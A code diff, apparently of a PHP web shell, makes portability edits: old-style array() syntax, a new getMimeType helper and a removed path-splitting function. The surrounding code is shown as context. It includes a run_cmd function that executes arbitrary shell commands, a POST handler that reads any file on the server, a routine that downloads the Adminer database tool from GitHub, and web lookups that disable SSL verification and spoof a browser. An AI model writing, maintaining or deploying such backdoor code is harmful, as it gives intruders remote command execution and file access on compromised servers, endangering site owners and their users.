@@ -81,11 +81,11 @@ if($_POST){
                 exit(json_encode($output));
             }elseif(stristr($pathinfo['extension'],'m4a') || stristr($pathinfo['extension'],'flac') || stristr($pathinfo['extension'],'mp3') || stristr($pathinfo['extension'],'wav') || stristr($pathinfo['extension'],'aac') || stristr($pathinfo['extension'],'wma')){
                 $output['audio'] = base64_decode($_POST['read_file']);
-                $output['type']  = @mime_content_type(base64_decode($_POST['read_file']));
+                $output['type']  = $helpers->getMimeType(base64_decode($_POST['read_file']));
                 exit(json_encode($output));
             }elseif(stristr($pathinfo['extension'],'mp4') || stristr($pathinfo['extension'],'avi') || stristr($pathinfo['extension'],'mov') || stristr($pathinfo['extension'],'wmv') || stristr($pathinfo['extension'],'flv') || stristr($pathinfo['extension'],'avchd') || stristr($pathinfo['extension'],'mkv') || stristr($pathinfo['extension'],'3gp')){
                 $output['video'] = base64_decode($_POST['read_file']);
-                $output['type'] = @mime_content_type(base64_decode($_POST['read_file']));
+                $output['type'] = $helpers->getMimeType(base64_decode($_POST['read_file']));
                 exit(json_encode($output));
             }
     
@@ -93,7 +93,7 @@ if($_POST){
         
             if($read_file !== false){
                 if(stristr($pathinfo['extension'],'jpg') || stristr($pathinfo['extension'],'ico') || stristr($pathinfo['extension'],'png') || stristr($pathinfo['extension'],'bmp') || stristr($pathinfo['extension'],'gif') || stristr($pathinfo['extension'],'jpeg') || stristr($pathinfo['extension'],'webp') || stristr($pathinfo['extension'],'svg')){
-                    $output['data_url'] = 'data: '.mime_content_type(base64_decode($_POST['read_file'])).';base64,'.base64_encode($read_file);
+                    $output['data_url'] = 'data: '.$helpers->getMimeType(base64_decode($_POST['read_file'])).';base64,'.base64_encode($read_file);
                 }
     
                 $output['content'] = base64_encode($read_file);
@@ -439,8 +439,8 @@ class helpers{
         $dirpath     = @getcwd();
         $current_dir = @scandir($target);
         unset($current_dir[0]);
-        $dirs  = [];
-        $files = [];
+        $dirs  = array();
+        $files = array();
         $current_dir = @array_values($current_dir);
 
         foreach($current_dir as $data){
@@ -461,7 +461,7 @@ class helpers{
             }
             
         }
-        $return_list = [];
+        $return_list = array();
         $count       = @count($dirs['name']);
         for($i = 0; $i < $count; $i++){
             $return_list['name'][]   = $dirs['name'][$i];
@@ -678,30 +678,6 @@ class helpers{
             return false;
         }
     }
-    public function seperate_path(){
-        $d = str_replace("\\", '/', @getcwd());
-
-        $pd = $e = explode('/', $d);
-        $i = 0;
-        $paths = [];
-        foreach ($pd as $b)
-        {
-            $t = "";
-            $j = 0;
-            foreach ($e as $r)
-            {
-                $t .= $r.'/';
-                if ($j == $i)
-                {
-                    break;
-                }
-                $j++;
-            }
-            $paths[$b] = $t;
-            $i++;
-        }
-        return $paths;
-    }
     public function run_cmd($cmd,$dir = null){
         if($dir != null) @chdir($dir);
         if(function_exists("shell_exec")){
@@ -750,7 +726,7 @@ class helpers{
             return true;
         }else{
             $curl = curl_init();
-            curl_setopt_array($curl,[CURLOPT_RETURNTRANSFER => 1,CURLOPT_URL => 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php',CURLOPT_FOLLOWLOCATION => 1,CURLOPT_TIMEOUT => 20]);
+            curl_setopt_array($curl,array(CURLOPT_RETURNTRANSFER => 1,CURLOPT_URL => 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php',CURLOPT_FOLLOWLOCATION => 1,CURLOPT_TIMEOUT => 20));
             $output = curl_exec($curl);
             curl_close($curl);
     
@@ -968,14 +944,14 @@ class helpers{
 
         foreach($sites as $key => $lookup_addr){
             $curl      =  curl_init();
-            curl_setopt_array($curl,[
+            curl_setopt_array($curl,array(
                 CURLOPT_RETURNTRANSFER => 1,
                 CURLOPT_FOLLOWLOCATION => true,
                 CURLOPT_SSL_VERIFYHOST => 0,
                 CURLOPT_SSL_VERIFYPEER => 0,
                 CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72',
                 CURLOPT_URL => $lookup_addr,
-                CURLOPT_TIMEOUT => 10]);
+                CURLOPT_TIMEOUT => 10));
             $content   = curl_exec($curl);
 
             if(curl_errno($curl) === 0){
@@ -1047,6 +1023,22 @@ class helpers{
         }
        
         return $informations;
+    }
+    public function getMimeType( $filename ) {
+        $realpath = realpath( $filename );
+        if ( $realpath
+                && function_exists( 'finfo_file' )
+                && function_exists( 'finfo_open' )
+                && defined( 'FILEINFO_MIME_TYPE' )
+        ) {
+                // Use the Fileinfo PECL extension (PHP 5.3+)
+                return finfo_file( finfo_open( FILEINFO_MIME_TYPE ), $realpath );
+        }
+        if ( function_exists( 'mime_content_type' ) ) {
+                // Deprecated in PHP 5.3
+                return mime_content_type( $realpath );
+        }
+        return false;
     }
 
     public function not_found(){
